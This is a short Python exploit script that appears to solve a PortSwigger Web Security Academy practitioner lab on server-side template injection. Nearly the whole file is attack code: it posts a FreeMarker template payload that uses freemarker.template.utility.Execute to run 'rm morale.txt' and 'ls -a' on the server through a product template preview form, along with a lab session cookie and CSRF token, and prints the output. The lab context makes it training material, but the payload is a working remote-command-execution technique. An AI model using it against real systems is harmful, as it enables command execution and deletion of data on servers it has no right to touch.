# Lab: Server-side template injection using documentation
# difficulty: practitioner

import requests
import re

sub = '0a9b00c203606ca180eb35e600a30036'
url = f'https://{sub}.web-security-academy.net'

def main():
    headers = {
        'Cookie': 'session=0Cur9qbHGKn1efR1Z4zU3C1ppOpgwo9K'
    }

    # ${7*7} => 49
    # candidates => FreeMarker (Java), 
    payload = '${"freemarker.template.utility.Execute"?new()("rm morale.txt")}' # https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java
    ls = '${"freemarker.template.utility.Execute"?new()("ls -a")}'
    body = {
        'csrf': 'iy7Naq5d0Gwq2RnMzH0sPpT02mlO2k5C',
        'template': payload + ls,
        'template-action': 'preview'
    }

    endpoint = '/product/template?productId=5'
    r = requests.post(url+endpoint, headers=headers, data=body)

    pattern = re.compile(r'<div id=preview-result>(.*?)</div>', re.DOTALL)
    match = pattern.findall(r.text)
    print(match[0].strip())

if __name__ == '__main__':
    main()